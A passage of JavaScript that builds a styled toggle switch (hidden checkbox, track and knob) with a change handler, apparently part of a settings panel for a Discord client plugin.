    const input = Object.assign(document.createElement('input'), {
      type: 'checkbox',
      checked: initialValue,
      style: 'opacity:0;width:0;height:0;',
    });
    const track = Object.assign(document.createElement('span'), {
      style: `position:absolute;inset:0;border-radius:24px;transition:background .2s;
                    background:${initialValue ? '#5865F2' : 'var(--background-modifier-accent)'};`,
    });
    const knob = Object.assign(document.createElement('span'), {
      style: `position:absolute;top:2px;left:${initialValue ? '22px' : '2px'};
                    width:20px;height:20px;border-radius:50%;background:#fff;
                    transition:left .2s;box-shadow:0 1px 3px rgba(0,0,0,.35);`,
    });
    input.addEventListener('change', () => {
      const v = input.checked;
      track.style.background = v
        ? '#5865F2'
        : 'var(--background-modifier-accent)';
      knob.style.left = v ? '22px' : '2px';
      onChange(v);
    });
    label.append(input, track, knob);
    return label;
  }
};
